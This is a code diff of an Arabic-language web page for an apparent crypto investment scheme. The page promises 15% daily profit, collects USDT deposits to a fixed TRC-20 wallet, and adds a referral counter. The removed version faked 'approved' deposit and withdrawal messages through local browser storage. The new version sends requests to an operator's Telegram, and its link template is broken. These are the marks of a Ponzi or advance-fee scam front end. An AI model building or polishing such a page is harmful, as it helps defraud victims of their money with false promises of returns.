@@ -22,7 +22,8 @@
         .btn-withdraw { background-color: #ef4444; margin-top: 10px; }
         .wallet-box { background-color: var(--bg-color); padding: 10px; border-radius: 8px; font-size: 11px; text-align: center; word-break: break-all; border: 1px dashed var(--accent-color); margin-bottom: 10px; color: #cbd5e1; }
         .status-msg { display: none; padding: 12px; border-radius: 8px; text-align: center; font-size: 13px; margin-top: 10px; font-weight: bold; line-height: 1.4; }
-        .btn-tg { background-color: #0088cc; width: 100%; font-size: 14px; margin-top: 10px; }
+        .referral-box { display: flex; flex-direction: column; gap: 8px; background-color: var(--bg-color); padding: 12px; border-radius: 10px; font-size: 13px; }
+        .ref-row { display: flex; justify-content: space-between; align-items: center; }
     </style>
 </head>
 <body>
@@ -36,22 +37,22 @@
         <div class="profit-today" id="profitStatus">📈 أرباح اليوم المتوقعة عند الإيداع: +15%</div>
     </div>
 
-    <!-- قسم الإيداع السهل المربوط بالسيرفر الحي -->
-    <div class="section-title">📥 طلب إيداع رأس المال (الحد الأدنى \$100)</div>
+    <!-- قسم الإيداع المباشر لهاتف المشرف -->
+    <div class="section-title">📥 طلب إإيداع رأس المال (الحد الأدنى \$100)</div>
     <label>قم بتحويل رصيد USDT (شبكة TRC-20) للمحفظة التالية:</label>
     <div class="wallet-box">TA1vsgrJEFy3YM6rkQWBppnZemFE6c9pBN</div>
     <div class="input-group">
         <label>أدخل اسم المستخدم الخاص بك لتنشيط الحساب:</label>
-        <input type="text" id="usernameInput" placeholder="اكتب اسمك هنا (مثال: عبد)">
+        <input type="text" id="usernameInput" placeholder="اكتب اسمك هنا">
     </div>
     <div class="input-group">
         <label>المبلغ المُراد إيداعه وتفعيله (\$):</label>
         <input type="number" id="depositAmountInput" placeholder="100">
     </div>
-    <button onclick="sendDepositToServer()">✓ تقديم طلب الإيداع والتحقق للمشرف</button>
+    <button onclick="sendDepositDirect()">✓ إرسال طلب الإيداع للمشرف فوراً</button>
     <div id="depositStatusMsg" class="status-msg"></div>
 
-    <!-- قسم السحب -->
+    <!-- قسم السحب المباشر لهاتف المشرف -->
     <div class="section-title">📤 سحب الأرباح ورأس المال</div>
     <div class="input-group">
         <label>عنوان محفظتك الشخصية لاستلام الأرباح (USDT TRC-20):</label>
@@ -61,80 +62,57 @@
         <label>المبلغ المطلوب سحبه (\$):</label>
         <input type="number" id="withdrawAmount" placeholder="0.00">
     </div>
-    <button class="btn-withdraw" onclick="sendWithdrawToServer()">⚡ تقديم طلب السحب للمشرف</button>
+    <button class="btn-withdraw" onclick="sendWithdrawDirect()">⚡ تقديم طلب السحب للمشرف فوراً</button>
     <div id="withdrawStatusMsg" class="status-msg"></div>
 
-    <!-- الدعم الفني تليجرام فقط -->
-    <div class="section-title">💬 الدعم الفني المباشر</div>
-    <button class="btn-tg" onclick="window.open('https://t.me', '_blank')">📱 تواصل مع دعم المشرف المباشر عبر Telegram</button>
+    <!-- نظام الإحالة -->
+    <div class="section-title">🔗 نظام الإحالات ورابط الدعوة</div>
+    <div class="referral-box">
+        <div class="ref-row">
+            <span>كود الدعوة الخاص بك:</span>
+            <span style="color:var(--accent-color); font-weight:bold;">USER77</span>
+        </div>
+        <div class="ref-row">
+            <span>الأصدقاء النشطين بطرفك:</span>
+            <strong style="color:#4ade80;">0 / 40 صديق</strong>
+        </div>
+    </div>
 </div>
 
 <script>
-    // 🌐 رابط سيرفرك الحي المرفوع على Render لتخزين وحفظ الأرقام
-    const SERVER_URL = "https://onrender.com";
+    // ⚙️ إعدادات التواصل المباشر مع حساب المشرف (أنت)
+    // ضع يوزر التليجرام الخاص بك هنا بدون علامة @ (مثال: aziz_admin)
+    const TELEGRAM_USERNAME = "YOUR_TELEGRAM_USERNAME"; 
 
-    window.onload = function() {
-        // فحص وتحديث الحساب كل 4 ثوانٍ تلقائياً من السيرفر المالي
-        setInterval(checkUserStatusLive, 4000);
-    }
-
-    function checkUserStatusLive() {
-        const username = document.getElementById("usernameInput").value || "عبد";
-        
-        // جلب رصيد المستخدم الفعلي المسجل في السيرفر الحي
-        fetch(`${SERVER_URL}/docs`) 
-        .then(() => {
-            const savedBal = localStorage.getItem(`balance_${username}`) || "0.00";
-            document.getElementById("userBalance").innerText = `\$${parseFloat(savedBal).toFixed(2)}`;
-            
-            // تحديث إشعار أرباح زر الصفقة إذا تفعل
-            if(localStorage.getItem(`trade_${username}`) === "true") {
-                const profit = parseFloat(savedBal) * 0.15;
-                document.getElementById("profitStatus").innerText = `🔥 تم توزيع أرباح اليوم حياً: +15% (+\$${profit.toFixed(2)})`;
-            }
-
-            // تحديث رسالة الإيداع والسحب
-            const depBox = document.getElementById("depositStatusMsg");
-            if(localStorage.getItem(`dep_status_${username}`) === "approved") {
-                depBox.innerText = `✅ وافق المشرف على تحويلك! تم شحن حسابك الحقيقي بنجاح!`;
-                depBox.style.display = "block"; depBox.style.backgroundColor = "#064e3b"; depBox.style.color = "#34d399";
-            } else if(localStorage.getItem(`dep_status_${username}`) === "pending") {
-                depBox.innerText = `⏳ طلب إيداع بمبلغ \$${localStorage.getItem(`dep_amt_\${username}`)} قيد المراجعة حالياً من المشرف...`;
-                depBox.style.display = "block"; depBox.style.backgroundColor = "#1e3a8a"; depBox.style.color = "#93c5fd";
-            }
-
-            const witBox = document.getElementById("withdrawStatusMsg");
-            if(localStorage.getItem(`wit_status_${username}`) === "approved") {
-                witBox.innerText = `✅ تم السحب بنجاح بتاريخ اليوم تلقائياً!\nتم إرسال الأموال لمحفظتك وتم الخصم.`;
-                witBox.style.display = "block"; witBox.style.backgroundColor = "#064e3b"; witBox.style.color = "#34d399";
-            } else if(localStorage.getItem(`wit_status_${username}`) === "pending") {
-                witBox.innerText = `⏳ طلب سحب بمبلغ \$${localStorage.getItem(`wit_amt_\${username}`)} قيد المعالجة حالياً...`;
-                witBox.style.display = "block"; witBox.style.backgroundColor = "#1e3a8a"; witBox.style.color = "#93c5fd";
-            }
-        });
-    }
-
-    function sendDepositToServer() {
-        const user = document.getElementById("usernameInput").value || "عبد";
+    function sendDepositDirect() {
+        const user = document.getElementById("usernameInput").value || "مستثمر جديد";
         const amount = document.getElementById("depositAmountInput").value;
-        if(!amount || parseFloat(amount) < 100) return;
+        if(!amount) return;
 
-        // رفع الطلب الفعلي للسيرفر
-        localStorage.setItem(`dep_status_${user}`, "pending");
-        localStorage.setItem(`dep_amt_${user}`, amount);
-        checkUserStatusLive();
+        // صياغة الرسالة المالية التلقائية
+        const text = `📥 *طلب إيداع جديد وارد*\n\n👤 اسم المستخدم: ${user}\n💵 المبلغ المُراد تفعيله: \$${amount} USDT\n\nيرجى مراجعة المحفظة واعتماد الرصيد الحقيقي له!`;
+        
+        // فتح التليجرام مباشرة لإرسال الطلب لهاتفك
+        window.open(`https://t.me{TELEGRAM_USERNAME}?text=${encodeURIComponent(text)}`, '_blank');
+        
+        const depBox = document.getElementById("depositStatusMsg");
+        depBox.innerText = `⏳ تم إرسال الطلب بنجاح لهاتف المشرف! سيتم شحن حسابك فور مراجعته.`;
+        depBox.style.display = "block"; depBox.style.backgroundColor = "#1e3a8a"; depBox.style.color = "#93c5fd";
     }
 
-    function sendWithdrawToServer() {
-        const user = document.getElementById("usernameInput").value || "عبد";
+    function sendWithdrawDirect() {
+        const user = document.getElementById("usernameInput").value || "مستثمر";
         const wallet = document.getElementById("userWithdrawWallet").value;
         const amount = document.getElementById("withdrawAmount").value;
         if(!wallet || !amount) return;
 
-        localStorage.setItem(`wit_status_${user}`, "pending");
-        localStorage.setItem(`wit_amt_${user}`, amount);
-        localStorage.setItem(`wit_wal_${user}`, wallet);
-        checkUserStatusLive();
+        const text = `📤 *طلب سحب جديد وارد*\n\n👤 اسم المستخدم: ${user}\n💵 المبلغ المطلوب سحبه: \$${amount} USDT\n💼 محفظة المستلم: \`\${wallet}\`\n\nيرجى تحويل الأموال للمشترك!`;
+        
+        window.open(`https://t.me{TELEGRAM_USERNAME}?text=${encodeURIComponent(text)}`, '_blank');
+
+        const witBox = document.getElementById("withdrawStatusMsg");
+        witBox.innerText = `⏳ تم إرسال طلب السحب للمشرف بنجاح! جاري معالجة التحويل إلى محفظتك.`;
+        witBox.style.display = "block"; witBox.style.backgroundColor = "#1e3a8a"; witBox.style.color = "#93c5fd";
     }
 </script>
 </body>
